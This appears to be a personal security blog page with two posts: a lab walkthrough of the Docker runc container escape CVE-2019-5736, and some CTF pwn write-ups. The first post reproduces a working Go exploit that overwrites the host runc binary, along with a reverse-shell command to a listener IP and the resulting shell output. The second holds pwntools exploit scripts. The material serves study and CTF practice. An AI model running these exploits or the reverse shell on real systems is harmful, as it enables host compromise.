            <a href="/2023/10/14/%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8%E5%AD%A6%E4%B9%A0-1/" class="post-title-link" itemprop="url">容器逃逸学习 (1)</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2023-10-14 19:02:57" itemprop="dateCreated datePublished" datetime="2023-10-14T19:02:57+08:00">2023-10-14</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2023-10-16 17:01:45" itemprop="dateModified" datetime="2023-10-16T17:01:45+08:00">2023-10-16</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">学习笔记</span></a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8%E7%B3%BB%E5%88%97/" itemprop="url" rel="index"><span itemprop="name">容器逃逸系列</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">Symbols count in article: </span>
              <span>6.3k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">Reading time &asymp;</span>
              <span>6 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>近年来，有些pwn题会出一些有关于容器逃逸的题目，虽然很多都是板子题，但如果没有学过相关内容，比赛的时候还是会两眼一抹黑。因此本文将开始容器逃逸的相关内容学习。</p>
<p>笔者的计划是，通过具体的已发布的漏洞开始，逐步向底层逻辑前进。</p>
<p>在这第1篇文章中，我们从一个CVE漏洞开始——CVE-2019-5736，作为容器逃逸的入门。</p>
<p>主要参考资料：<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/266144563">传送门</a>（笔者觉得这篇文章写的非常好）</p>
<p>这是一个著名的Docker容器逃逸漏洞，影响范围为：Docker 18.09.2及以前，这些版本的Docker使用了1.0-rc6及以下的docker-runc从而导致漏洞。漏洞的成因是攻击者对主机的runc二进制文件进行重写，从而在提权的同时完成逃逸。下面我们就来具体了解一下这个漏洞本身。</p>
<h1 id="1-docker架构简介"><a class="markdownIt-Anchor" href="#1-docker架构简介"></a> 1. Docker架构简介</h1>
<p>要了解这个漏洞，首先就要了解docker-runc是干什么的。我们从<a target="_blank" rel="noopener" href="https://download.docker.com/linux/static/test/x86_64/">这里</a>可以下载到各种版本的Docker，其中大多都是压缩包。解压压缩包我们会发现其中有几个可执行文件：</p>
<ul>
<li>docker: Docker客户端程序，也是我们最常用的elf，用于对镜像、容器等进行操作。</li>
<li>docker-containerd: 一个与Docker容器有关的守护进程，用于管理容器的创建、运行和销毁等操作。</li>
<li>docker-containerd-ctr: 与docker-containerd交互的命令行程序。</li>
<li>docker-containerd-shim: docker-containerd-ctr和docker-containerd的中间进程，负责通信等工作。</li>
<li><font color=red>dockerd</font>: Docker服务器进程。我们需要知道的是，Docker是以CS架构开发的，平时使用docker命令实质上也都是在和dockerd这个本地的服务器进程进行交互。</li>
<li>docker-init: 轻量级的初始化进程，用于完成容器创建时的初始化操作，并作为容器进程的父进程。</li>
<li>docker-proxy: 网络代理程序，负责容器之间的通信。</li>
<li>docker-runc: 轻量级的容器运行时工具，用于创建和运行容器，负责解析容器的配置并构建隔离环境。</li>
</ul>
<p>也就是说，这个漏洞主要是对这个运行时工具进行攻击。</p>
<h1 id="2-cve-2019-5736介绍"><a class="markdownIt-Anchor" href="#2-cve-2019-5736介绍"></a> 2. CVE-2019-5736介绍</h1>
<p>这个漏洞的PoC可以在<a target="_blank" rel="noopener" href="https://github.com/Frichetten/CVE-2019-5736-PoC">这里</a>找到。</p>
<p>我们来结合这个PoC对这个漏洞的成因与利用方式进行分析。</p>
<figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="comment">// Implementation of CVE-2019-5736</span></span><br><span class="line"><span class="comment">// Created with help from @singe, @_cablethief, and @feexd.</span></span><br><span class="line"><span class="comment">// This commit also helped a ton to understand the vuln</span></span><br><span class="line"><span class="comment">// https://github.com/lxc/lxc/commit/6400238d08cdf1ca20d49bafb85f4e224348bf9d</span></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;io/ioutil&quot;</span></span><br><span class="line">	<span class="string">&quot;os&quot;</span></span><br><span class="line">	<span class="string">&quot;strconv&quot;</span></span><br><span class="line">	<span class="string">&quot;strings&quot;</span></span><br><span class="line">	<span class="string">&quot;flag&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> shellCmd <span class="type">string</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">init</span><span class="params">()</span></span> &#123;</span><br><span class="line">	flag.StringVar(&amp;shellCmd, <span class="string">&quot;shell&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;Execute arbitrary commands&quot;</span>)</span><br><span class="line">	flag.Parse()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="comment">// This is the line of shell commands that will execute on the host</span></span><br><span class="line">	<span class="keyword">var</span> payload = <span class="string">&quot;#!/bin/bash \n&quot;</span> + shellCmd</span><br><span class="line">	<span class="comment">// First we overwrite /bin/sh with the /proc/self/exe interpreter path</span></span><br><span class="line">	fd, err := os.Create(<span class="string">&quot;/bin/sh&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Println(err)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	fmt.Fprintln(fd, <span class="string">&quot;#!/proc/self/exe&quot;</span>)</span><br><span class="line">	err = fd.Close()</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Println(err)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	fmt.Println(<span class="string">&quot;[+] Overwritten /bin/sh successfully&quot;</span>)</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Loop through all processes to find one whose cmdline includes runcinit</span></span><br><span class="line">	<span class="comment">// This will be the process created by runc</span></span><br><span class="line">	<span class="keyword">var</span> found <span class="type">int</span></span><br><span class="line">	<span class="keyword">for</span> found == <span class="number">0</span> &#123;</span><br><span class="line">		pids, err := ioutil.ReadDir(<span class="string">&quot;/proc&quot;</span>)</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">			fmt.Println(err)</span><br><span class="line">			<span class="keyword">return</span></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">for</span> _, f := <span class="keyword">range</span> pids &#123;</span><br><span class="line">			fbytes, _ := ioutil.ReadFile(<span class="string">&quot;/proc/&quot;</span> + f.Name() + <span class="string">&quot;/cmdline&quot;</span>)</span><br><span class="line">			fstring := <span class="type">string</span>(fbytes)</span><br><span class="line">			<span class="keyword">if</span> strings.Contains(fstring, <span class="string">&quot;runc&quot;</span>) &#123;</span><br><span class="line">				fmt.Println(<span class="string">&quot;[+] Found the PID:&quot;</span>, f.Name())</span><br><span class="line">				found, err = strconv.Atoi(f.Name())</span><br><span class="line">				<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">					fmt.Println(err)</span><br><span class="line">					<span class="keyword">return</span></span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// We will use the pid to get a file handle for runc on the host.</span></span><br><span class="line">	<span class="keyword">var</span> handleFd = <span class="number">-1</span></span><br><span class="line">	<span class="keyword">for</span> handleFd == <span class="number">-1</span> &#123;</span><br><span class="line">		<span class="comment">// Note, you do not need to use the O_PATH flag for the exploit to work.</span></span><br><span class="line">		handle, _ := os.OpenFile(<span class="string">&quot;/proc/&quot;</span>+strconv.Itoa(found)+<span class="string">&quot;/exe&quot;</span>, os.O_RDONLY, <span class="number">0777</span>)</span><br><span class="line">		<span class="keyword">if</span> <span class="type">int</span>(handle.Fd()) &gt; <span class="number">0</span> &#123;</span><br><span class="line">			handleFd = <span class="type">int</span>(handle.Fd())</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	fmt.Println(<span class="string">&quot;[+] Successfully got the file handle&quot;</span>)</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Now that we have the file handle, lets write to the runc binary and overwrite it</span></span><br><span class="line">	<span class="comment">// It will maintain it&#x27;s executable flag</span></span><br><span class="line">	<span class="keyword">for</span> &#123;</span><br><span class="line">		writeHandle, _ := os.OpenFile(<span class="string">&quot;/proc/self/fd/&quot;</span>+strconv.Itoa(handleFd), os.O_WRONLY|os.O_TRUNC, <span class="number">0700</span>)</span><br><span class="line">		<span class="keyword">if</span> <span class="type">int</span>(writeHandle.Fd()) &gt; <span class="number">0</span> &#123;</span><br><span class="line">			fmt.Println(<span class="string">&quot;[+] Successfully got write handle&quot;</span>, writeHandle)</span><br><span class="line">			fmt.Println(<span class="string">&quot;[+] The command executed is&quot;</span> + payload)</span><br><span class="line">			writeHandle.Write([]<span class="type">byte</span>(payload))</span><br><span class="line">			<span class="keyword">return</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="a-覆盖binsh"><a class="markdownIt-Anchor" href="#a-覆盖binsh"></a> A. 覆盖/bin/sh</h2>
<p>在PoC中可以看到，<code>fmt.Fprintln</code>将/bin/sh这个<strong>二进制</strong>文件的前面几个字节修改成了<code>#!/proc/self/exe\n</code>，什么意思呢？这相当于迷惑了Linux系统，将它视作一个Linux Shell文件而不是ELF二进制可执行文件。通过这种覆盖，/bin/sh仍然可以执行，但实际上它完成的将不再是/bin/sh原本的功能，而是跑去执行<code>/proc/self/exe</code>这个文件。</p>
<p>那么<code>/proc/self/exe</code>这个文件又是什么？为什么要执行这个文件呢？在文章开头的资料中给出了答案。</p>
<h2 id="b-找到docker-runc进程"><a class="markdownIt-Anchor" href="#b-找到docker-runc进程"></a> B. 找到docker-runc进程</h2>
<p>在<code>/proc</code>目录中，有很多以数字命名的目录，每一个数字都代表当前一个进程的进程号，而目录中则提供了与这个进程有关的文件，其中就有exe文件。这个文件是一个<strong>符号链接</strong>，指向创建这个进程的可执行文件或这个进程加载的动态链接库。</p>
<p>好，现在我们已经知道进程的可执行文件本身能够在/proc中找到，那么这和本文要讲的CVE有什么关系呢？这就需要了解一下docker-runc的工作原理了。在启动一个容器时，docker-runc会首先构建文件系统等配置，然后fork一次，在子进程调用容器的启动文件完成启动。这样做的结果是，docker-runc这个进程本身也能在容器的进程列表中找到。既然docker-runc在容器中也拥有一个进程号，我们就能够通过遍历所有进程找到它。</p>
<p>具体的遍历方法是：遍历所有进程的cmdline文件并查找runc字符串。cmdline文件顾名思义，保存了进程的命令行参数。如果docker-runc程序位于进程表中，runc一定能够在命令行参数中找到。</p>
<h2 id="c-尝试以只读方式打开runc文件"><a class="markdownIt-Anchor" href="#c-尝试以只读方式打开runc文件"></a> C. 尝试以只读方式打开runc文件</h2>
<p>找到了我们要的进程号之后，我们就可以打开对应的exe文件了。但需要注意的是，这个文件本身是只读的，我们不能直接以读写模式打开，因此这里利用了一个/proc文件的特性。<strong>打开/proc目录下的文件时，不受mnt命名空间的影响，在进行权限检查后就能直接获得文件描述符。</strong></p>
<p>对于一个普通路径下的文件，当进程打开这个文件时，mnt命名空间会对路径进行解析，并生成文件系统视图，确定进程是否能够打开这个文件。但是对于/proc目录则不受mnt命名空间的影响，这使得以其他权限打开文件描述符成为可能，也即——绕过了mnt命名空间的约束。经过与老师的讨论，我不将这个特性视为Linux系统的漏洞。</p>
<p>需要注意的是，打开这个文件本身需要在容器中具有root权限，如果没有，则可能还需要完成提权。</p>
<h2 id="d-以读写方式打开文件描述符"><a class="markdownIt-Anchor" href="#d-以读写方式打开文件描述符"></a> D. 以读写方式打开文件描述符</h2>
<p>以只读方式打开exe文件后，可通过以读写方式打开文件描述符的方式绕过权限限制，打开exe文件，实际上就是docker-runc文件。考虑到Linux系统中不允许修改正在执行的程序文件，因此这里需要多次尝试，在docker-runc停止工作时以抢占的方式打开这个文件。</p>
<h2 id="e-篡改主机的docker-runc文件注入payload"><a class="markdownIt-Anchor" href="#e-篡改主机的docker-runc文件注入payload"></a> E. 篡改主机的docker-runc文件，注入payload</h2>
<p>当docker-runc文件可写后，我们就可以向其中写入任意代码并执行。</p>
<h1 id="3-cve-2019-5736复现"><a class="markdownIt-Anchor" href="#3-cve-2019-5736复现"></a> 3. CVE-2019-5736复现</h1>
<h2 id="a-准备工作"><a class="markdownIt-Anchor" href="#a-准备工作"></a> A. 准备工作</h2>
<p>为了复现这个漏洞，我们需要下载18.09.2以下版本的docker。这里推荐一个仓库，可以很方便地安装用于漏洞复现的docker环境：<a target="_blank" rel="noopener" href="https://github.com/Metarget/metarget">链接</a>。下面是下载版本：</p>
<ul>
<li>docker: 18.03.1-ce</li>
<li>镜像：Ubuntu 16.04（这个需要注意，由于我们使用的docker版本比较低，如果下载18.04及以上的Ubuntu会报错：Error response from daemon: missing signature key，只能下载更低版本的Ubuntu。）</li>
<li>容器创建：docker run -it ubuntu:16.04 /bin/bash</li>
</ul>
<h2 id="b-编译文件"><a class="markdownIt-Anchor" href="#b-编译文件"></a> B. 编译文件</h2>
<p>最新版本的PoC中将要执行的命令移动到了命令行参数中，方便我们灵活地执行任意代码。PoC仓库：<a target="_blank" rel="noopener" href="https://github.com/Frichetten/CVE-2019-5736-PoC">链接</a></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">go build main.go</span><br></pre></td></tr></table></figure>
<p>之后将编译好的PoC复制到docker容器。</p>
<h2 id="c-触发漏洞"><a class="markdownIt-Anchor" href="#c-触发漏洞"></a> C. 触发漏洞</h2>
<p>笔者初学容器逃逸，按照网上的方法尝试了很多次，才终于找到漏洞触发的方法。最后发现是网上的方法说的不详细。</p>
<h3 id="step-1"><a class="markdownIt-Anchor" href="#step-1"></a> Step 1</h3>
<p>在另一台虚拟机（192.168.198.135）中打开50000端口的监听，设置PoC的任意执行命令为反弹shell命令：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.198.135/50000 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
<h3 id="step-2"><a class="markdownIt-Anchor" href="#step-2"></a> Step 2</h3>
<p>用bash作为命令行打开容器：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="built_in">exec</span> -it &lt;容器名&gt; bash</span><br></pre></td></tr></table></figure>
<h3 id="step-3"><a class="markdownIt-Anchor" href="#step-3"></a> Step 3</h3>
<p>apt update，安装netcat。</p>
<p>复制PoC二进制ELF执行PoC代码，立即可以看到/bin/sh被覆盖的提示信息，但是一直找不到runc进程，这是因为目前docker还没有需要runc参与的任务。</p>
<h3 id="step-4"><a class="markdownIt-Anchor" href="#step-4"></a> Step 4</h3>
<p>在主机另一个终端打开容器的命令行让PoC检测到runc。但这次一定要用/bin/sh打开命令行而不是bash。docker exec命令执行后瞬间就可以看到runc进程被修改的提示信息。在新的终端中用sh无法打开容器的命令行，显示<code>No help topic for '/bin/sh'</code>。</p>
<h3 id="step-5"><a class="markdownIt-Anchor" href="#step-5"></a> Step 5</h3>
<p>在新的终端再一次尝试用sh打开容器的命令行，随后命令行阻塞，成功执行反弹shell代码，下面是攻击者机器的部分命令行显示内容：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">root@colin-virtual-machine:~/Desktop<span class="comment"># nc -vv -lp 50000</span></span><br><span class="line">Listening on 0.0.0.0 50000</span><br><span class="line">Connection received on 192.168.198.xxx 42248</span><br><span class="line">bash: cannot <span class="built_in">set</span> terminal process group (8750): Inappropriate ioctl <span class="keyword">for</span> device</span><br><span class="line">bash: no job control <span class="keyword">in</span> this shell</span><br><span class="line">&lt;ebe2896995719366ddc8dd1893c0081bff30f6c5cf7d3c339<span class="comment"># ls</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">16505d598214f0c33ba21d8e96f5ecf34db215d32ba229527a67314d7ed96c7a.pid</span><br><span class="line">config.json</span><br><span class="line">init.pid</span><br><span class="line">log.json</span><br><span class="line">rootfs</span><br><span class="line">&lt;ebe2896995719366ddc8dd1893c0081bff30f6c5cf7d3c339<span class="comment"># uname -a</span></span><br><span class="line"><span class="built_in">uname</span> -a</span><br><span class="line">Linux ubuntu 5.4.0-150-generic <span class="comment">#167~18.04.1-Ubuntu SMP Wed May 24 00:51:42 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux</span></span><br><span class="line">&lt;ebe2896995719366ddc8dd1893c0081bff30f6c5cf7d3c339<span class="comment"># pwd</span></span><br><span class="line"><span class="built_in">pwd</span></span><br><span class="line">/run/docker/containerd/daemon/io.containerd.runtime.v1.linux/moby/cf90012c3bea6ddebe2896995719366ddc8dd1893c0081bff30f6c5cf7d3c339</span><br><span class="line">&lt;ebe2896995719366ddc8dd1893c0081bff30f6c5cf7d3c339<span class="comment"># </span></span><br></pre></td></tr></table></figure>
<p>复现完毕。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
    <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2023/03/25/buuctf-pwn-write-ups-13/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="CoLin">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CoLin's BLOG">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/03/25/buuctf-pwn-write-ups-13/" class="post-title-link" itemprop="url">buuctf-pwn write-ups (13)</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2023-03-25 17:14:12" itemprop="dateCreated datePublished" datetime="2023-03-25T17:14:12+08:00">2023-03-25</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2023-04-03 22:18:07" itemprop="dateModified" datetime="2023-04-03T22:18:07+08:00">2023-04-03</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/write-ups/" itemprop="url" rel="index"><span itemprop="name">write-ups</span></a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/write-ups/buuctf-%E7%B3%BB%E5%88%97/" itemprop="url" rel="index"><span itemprop="name">buuctf 系列</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">Symbols count in article: </span>
              <span>5.9k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">Reading time &asymp;</span>
              <span>5 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="buu102-starctf_2019_babyshell"><a class="markdownIt-Anchor" href="#buu102-starctf_2019_babyshell"></a> buu102-starctf_2019_babyshell</h1>
<p>这道题虽然说有一个check函数检查输入的shellcode是否全部都是白名单里面的字符，但实际上我们可以通过开头1个字符为\x00的指令来绕过这个检查，然后写入任意字符。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process([&#x27;./pwn&#x27;])</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">25580</span>)</span><br><span class="line"></span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">	sa(<span class="string">b&#x27;give me shellcode, plz:\n&#x27;</span>, <span class="string">b&#x27;\x00\x2f&#x27;</span> + asm(shellcraft.amd64.sh()))</span><br><span class="line">	io.interactive()</span><br></pre></td></tr></table></figure>
<h1 id="buu103-actf_2019_babyheap"><a class="markdownIt-Anchor" href="#buu103-actf_2019_babyheap"></a> buu103-actf_2019_babyheap</h1>
<p>一道简单的堆排布问题，错开分配到控制chunk，改函数指针，/bin/sh在程序中已经有了。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">26355</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x)</span><br><span class="line">rud = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">ita = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size, content</span>):</span><br><span class="line">	sla(<span class="string">b&#x27;Your choice: &#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">	sla(<span class="string">b&#x27;Please input size: &#x27;</span>, <span class="built_in">str</span>(size).encode())</span><br><span class="line">	sa(<span class="string">b&#x27;Please input content: &#x27;</span>, content)</span><br><span class="line">	</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">	sla(<span class="string">b&#x27;Your choice: &#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">	sla(<span class="string">b&#x27;Please input list index: &#x27;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line">	</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">	sla(<span class="string">b&#x27;Your choice: &#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">	sla(<span class="string">b&#x27;Please input list index: &#x27;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line">	</span><br><span class="line">binsh = <span class="number">0x602010</span></span><br><span class="line">	</span><br><span class="line">add(<span class="number">0x20</span>, <span class="string">b&#x27;a\n&#x27;</span>)</span><br><span class="line">add(<span class="number">0x10</span>, <span class="string">b&#x27;a\n&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x30</span>, <span class="string">b&#x27;a\n&#x27;</span>)</span><br><span class="line">add(<span class="number">0x10</span>, p64(binsh) + p64(elf.plt[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">ita()</span><br></pre></td></tr></table></figure>
<h1 id="buu193-starctf2018_babystack"><a class="markdownIt-Anchor" href="#buu193-starctf2018_babystack"></a> buu193-starctf2018_babystack</h1>
<p>前面的题目大同小异，这里就直接跳到第7页开始做了，看看能不能学点新东西。<br />
这道题有一个<code>pthread_create</code>函数创建了一个新的线程，在这个线程中有一个很大的栈溢出。这里我们需要通过对程序内存空间的分析理解本题的利用思路。<br />
本题创建的线程的栈正好位于TLS结构体下面，TLS结构体位于libc加载基地址的前一页。记得TLS在house of emma中提到过，其中包含了canary的值，而本题中正好有canary，因此要溢出就必须溢出到覆盖canary的值。幸运的是，本题是可以实现的。<br />
我们可以通过ret2csu调用read函数写入一个one gadget到bss段中某处，然后通过调用puts函数获取到libc的基地址，最后进行栈迁移将rsp修改为写one gadget的地址，最后调用one gagdet。这里进行栈迁移的主要目的是确保栈空间的完全纯净，因为几乎所有的one gadget都要求栈中某个地方的值为0。另外此题不能通过调用<code>system</code>函数的方式getshell，因为此时我们已经覆盖了TLS结构体，无法成功调用system函数，而one gadget通常都是使用syscall指令来get shell的，因此没有影响。</p>
